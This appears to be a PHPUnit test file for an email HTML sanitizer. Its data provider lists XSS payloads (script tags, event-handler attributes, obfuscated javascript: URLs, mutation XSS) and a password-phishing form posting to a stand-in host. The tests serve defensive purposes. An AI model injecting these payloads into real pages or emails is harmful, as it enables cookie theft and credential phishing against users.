<?php

namespace Tests\Unit\Security;

use App\Security\Html\EmailHtmlSanitizer;
use App\Security\ImageProxySigner;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/** SEC-T16: untrusted email HTML never yields active content. */
class EmailHtmlSanitizerTest extends TestCase
{
    protected bool $seed = false;

    private function clean(string $html, bool $images = false): string
    {
        return app(EmailHtmlSanitizer::class)->sanitize($html, $images)->html;
    }

    /** @return array<string, array{string}> */
    public static function xssVectors(): array
    {
        return [
            'script' => ['<p>hi</p><script>alert(1)</script>'],
            'img onerror' => ['<img src=x onerror=alert(1)>'],
            'svg onload' => ['<svg onload=alert(1)><circle/></svg>'],
            'javascript href' => ['<a href="javascript:alert(1)">x</a>'],
            'entity-encoded javascript' => ['<a href="&#106;avascript:alert(1)">x</a>'],
            'whitespace javascript' => ["<a href=\" java\tscript:alert(1)\">x</a>"],
            'data html link' => ['<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>'],
            'vbscript' => ['<a href="vbscript:msgbox(1)">x</a>'],
            'iframe' => ['<iframe src="https://evil.example"></iframe>'],
            'iframe srcdoc' => ['<iframe srcdoc="<script>alert(1)</script>"></iframe>'],
            'object' => ['<object data="evil.swf"></object>'],
            'embed' => ['<embed src="evil.swf">'],
            'form phishing' => ['<form action="https://evil.example/steal"><input name=password type=password><button>Login</button></form>'],
            'meta refresh' => ['<meta http-equiv="refresh" content="0;url=https://evil.example">'],
            'base hijack' => ['<base href="https://evil.example/">'],
            'style expression' => ['<div style="width: expression(alert(1))">x</div>'],
            'style url' => ['<div style="background-image: url(javascript:alert(1))">x</div>'],
            'style import' => ['<style>@import "https://evil.example/x.css";</style>'],
            'body onload' => ['<body onload=alert(1)>x</body>'],
            'mathml' => ['<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>'],
            'mutation xss' => ['<noscript><p title="</noscript><img src=x onerror=alert(1)>">'],
            'details ontoggle' => ['<details open ontoggle=alert(1)>'],
            'link stylesheet' => ['<link rel=stylesheet href="https://evil.example/x.css">'],
            'srcset' => ['<img srcset="https://evil.example/a.png 1x">'],
            'event on anchor' => ['<a href="https://ok.example" onclick="alert(1)" onmouseover="alert(2)">x</a>'],
        ];
    }

    #[DataProvider('xssVectors')]
    public function test_no_active_content_survives(string $html): void
    {
        $out = $this->clean($html);

        $this->assertDoesNotMatchRegularExpression('/<\s*(script|iframe|object|embed|form|input|button|svg|math|meta|base|link|style|textarea|select)\b/i', $out);
        $this->assertDoesNotMatchRegularExpression('/\son[a-z]+\s*=/i', $out, 'event handler attribute');
        $this->assertDoesNotMatchRegularExpression('/(java|vb)script\s*:/i', $out);
        $this->assertDoesNotMatchRegularExpression('/expression\s*\(|url\s*\(|@import|srcset|srcdoc/i', $out);
        $this->assertStringNotContainsString('data:text/html', $out);
    }

    /** Dangerous containers are removed with their contents, not just unwrapped. */
    public function test_script_style_and_form_contents_are_removed_not_shown_as_text(): void
    {
        $out = $this->clean('<p>Visible</p><script>stealCookies()</script><style>.x{color:red}</style><form><input value="pw"></form>'
            .'<noscript>fallback</noscript><button>Pay now</button><select><option>Choose bank</option></select><textarea>Enter PIN</textarea>'
            .'<video>clip</video><audio>sound</audio><dialog>Confirm</dialog><template>tpl</template><title>Fake</title>');

        $this->assertStringContainsString('Visible', $out);
        foreach (['stealCookies', 'color:red', 'pw', 'Pay now', 'fallback', 'Choose bank', 'Enter PIN', 'clip', 'sound', 'Confirm', 'tpl', 'Fake'] as $leftover) {
            $this->assertStringNotContainsString($leftover, $out);
        }
    }

    public function test_formatting_tables_and_safe_links_are_preserved(): void
    {
        $out = $this->clean('<table border="0" cellpadding="4"><tr><td align="center" style="color: #1a4fa0; font-weight: bold; position: fixed">Q4</td></tr></table><p><a href="https://mt.co.tz/report" target="_blank">Report</a> <strong>now</strong></p>');

        $this->assertStringContainsString('<table', $out);
        $this->assertStringContainsString('align="center"', $out);
        $this->assertStringContainsString('color: #1a4fa0', $out);
        $this->assertStringNotContainsString('position', $out, 'non-allow-listed CSS property dropped');
        $this->assertStringContainsString('href="https://mt.co.tz/report"', $out);
        $this->assertStringContainsString('rel="noopener noreferrer nofollow"', $out);
        $this->assertStringNotContainsString('target=', $out);
        $this->assertStringContainsString('<strong>now</strong>', $out);
    }

    public function test_remote_images_are_blocked_by_default_and_counted(): void
    {
        $result = app(EmailHtmlSanitizer::class)->sanitize('<img src="https://tracker.example/pixel.gif?u=ceo"><img src="http://cdn.example/logo.png">');

        $this->assertSame(2, $result->blockedRemoteImages);
        $this->assertStringNotContainsString('tracker.example', $result->html);
        $this->assertStringNotContainsString('cdn.example', $result->html);
    }

    public function test_consented_remote_images_go_through_the_signed_proxy_only(): void
    {
        $out = $this->clean('<img src="https://cdn.example/logo.png">', images: true);

        preg_match('/src="([^"]+)"/', $out, $m);
        $src = html_entity_decode($m[1] ?? '');
        $this->assertStringStartsWith(rtrim((string) config('app.url'), '/').'/api/v1/image-proxy?', $src);
        parse_str((string) parse_url($src, PHP_URL_QUERY), $q);
        $this->assertSame('https://cdn.example/logo.png', $q['u']);
        $this->assertTrue(app(ImageProxySigner::class)->verify($q['u'], (int) $q['exp'], $q['sig']));
        $this->assertFalse(app(ImageProxySigner::class)->verify('https://other.example/x.png', (int) $q['exp'], $q['sig']));
    }

    public function test_inline_cid_images_and_small_data_images_are_kept(): void
    {
        $png = 'data:image/png;base64,'.base64_encode('PNGDATA');
        $result = app(EmailHtmlSanitizer::class)->sanitize('<img src="cid:logo@mt.co.tz"><img src="'.$png.'"><img src="data:image/svg+xml;base64,PHN2Zz4=">');

        $html = html_entity_decode($result->html); // attribute values are entity-encoded
        $this->assertSame(['logo@mt.co.tz'], $result->contentIds);
        $this->assertStringContainsString('src="cid:logo@mt.co.tz"', $html);
        $this->assertStringContainsString($png, $html);
        $this->assertStringNotContainsString('svg+xml', $html, 'SVG data images can carry script');
    }
}
